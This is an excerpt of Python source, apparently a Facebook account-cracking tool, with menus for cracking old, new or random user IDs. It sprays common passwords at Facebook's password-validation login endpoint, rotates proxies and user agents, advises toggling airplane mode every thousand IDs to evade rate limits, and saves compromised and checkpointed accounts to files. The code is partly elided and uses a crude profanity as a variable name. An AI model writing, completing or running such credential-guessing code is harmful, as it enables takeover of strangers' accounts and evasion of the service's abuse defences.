...
class CrackEng:
	...
	def __init__(self):
		self.id,self.idx,self.ua,self.prx,self.uaxz, self.uaromz, self.ENG = [],[],[],[],[],[],[]
	...
	def romiy(self,id):
		self.idx = id 
		tulis(Panel(f""" {Te}{U}• {P}01{O} Crack from old ID\n {U}• {P}02{O} Crack from new ID\n {U}• {P}03{O} Random ID crack""",
		title = f'{Te}{M}[ {H}Select ID {M}]',style='#FF0022'))
		urut = input('%s╰─ %sSelect %s> %s'%(p,o,m,k))
		if urut in['']:
		...
		if 'rndm' in self.uaxz:
			unikersx = input('%s╰─%s use manual password? y/t%s > %s'%(p,o,m,k))
			if unikersx in ('Y', 'y'):
				self.manualx()
			elif unikersx in ('T', 't'):
				tulis(Panel(f""" {Te}{U}• {P}01{O} methode{M} free{O} (fast)\n {U}• {P}02{O} methode{P} mbasic{O} (slow)\n {U}• {P}03{O} methode{H} mobile{O} (very slow) {H}recommended""",title = f'{Te}{M}[ {H}Methode {M}]',style='#FF0022'))
				self.langsungx()
			else:
				exit("%s╰─%s choose the right one "%(p,m));jeda(2)
		else:
			pass
		unikers = input('%s╰─%s use manual password? y/t%s > %s'%(p,o,m,k))
		if unikers in ('Y', 'y'):
			self.manual()
		elif unikers in ('T', 't'):
			tulis(Panel(f""" {Te}{U}• {P}01{O} methode{M} free{O} (fast)\n {U}• {P}02{O} methode{P} mbasic{O} (slow)\n {U}• {P}03{O} methode{H} mobile{O} (very slow) {H}recommended""",title = f'{Te}{M}[ {H}Methode {M}]',style='#FF0022'))
	...
	#--- SETTING PROXY
	def set_prox(self):
		sleeh = input('%s╰─%s you want to use a proxy? y/t%s > %s'%(p,o,m,k))
		if sleeh in['y','Y']:
	...
	#--- SETTING USER AGENT
	def useragent(self):
		tulis(Panel(f"""{Te}{U} •{P} 01 {O}Use the script's default user agents
{U} •{P} 02 {O}Use random user agents (48)
{U} •{P} 03 {O}Use your own user agents""",
		title=f"{Te}{M}[{H} User agents{M} ]",style='#FF0022'))
		_romz_ = input('%s╰─%s Select%s >%s '%(p,o,m,k))
		if _romz_ == '':
			exit("%s╰─%s choose the right one "%(p,m));jeda(2)
		elif _romz_ in["1","01"]:
			try:
			...
			tulis(Panel(f"{Te}{U} •{O} Type {H}My user agent{O} in google chrome browser\n {U}•{O} to get your cellphone user agent",style='#FF0022'))
			try:
				xix = input("%s╰─%s enter user agent %s> %s"%(p,o,m,h))
				if xix in[""]:
					try:
			...
			try:
				...
				kontol = '-'
			tulis(Panel(f"{Te}{O}{kontol}",title=f"{Te}{M}[{H} Your user agent{M} ]",style='#FF0022'))
		else:
			pass
	...
	def manual(self): 
		global prog,des 
		tulis(Panel(f'{Te}{U} •{O} example{M} >{O} qwerty{M},{O}123456{M},{O}12345678',style='#FF0022'))
		pwek = input('%s╰─%s password %s> %s'%(p,o,m,k))
		if pwek == '':
			exit("%s╰─%s don't be empty "%(p,m))
		elif len(pwek)<=5:
			exit('%s╰─%s Password minimum 6 characters'%(p,m))
		else:
			pass 
		tulis(Panel(f""" {Te}{U}• {P}01{O} methode{M} free{O} (fast)\n {U}• {P}02{O} methode{P} mbasic{O} (slow)\n {U}• {P}03{O} methode{H} mobile{O} (very slow) {H}recommended""",title = f'{Te}{M}[ {H}Methode {M}]',style='#FF0022'))
		sluut = input('%s╰─ %sSelect %s> %s'%(p,o,m,k))
		self.set_prox()
		tulis(Panel(f'{Te}{U} {til}{O} account {H}[OK] {O}saved to file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} account {K}[CP] {O}saved to file {M}> {K}OK/{waktu}.txt \n {U}!{O} every crack 1k ID, play airplane mode 2 seconds',style='#FF0022'))
		...
		try:
			...
			for xyz_ in peweh:
				...
				zooz ={
						...
						"accept-language":"en-GB,en-US;q=0.9,en;q=0.8" #"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
					}
				soos ={
						"Host":url_log,
						"cache-control":"max-age=0",
						...
						"sec-fetch-user":"?1",
						"sec-fetch-dest":"document",
						"referer":f"https://{url_log}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",
						"accept-encoding":"gzip, deflate br",
						"accept-language":"en-GB,en-US;q=0.9,en;q=0.8" #"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
					}
				if 'prox' in self.prx:
					...
					pex = ses.get(f"https://{url_log}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",headers=zooz).text 
					dataa ={
					...
					po = ses.post(f"https://{url_log}/login/device-based/validate-password/?shbl=0",data=dataa,headers=soos,proxies=proox,allow_redirects = False)
				else:
					pex = ses.get(f"https://{url_log}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F",headers=zooz).text 
					dataa ={
						"lsd":re.search('name="lsd" value="(.*?)"', str(pex)).group(1),
					...
					po = ses.post(f"https://{url_log}/login/device-based/validate-password/?shbl=0",data=dataa,headers=soos,allow_redirects = False)
...
#---------------------------------------------------------------------------------------------------------------#
	...
	def cek_apk(self,kukis):
		...
		try:
			...
			print ("\r     %s╰─ %sfailed to check game"%(p,m))
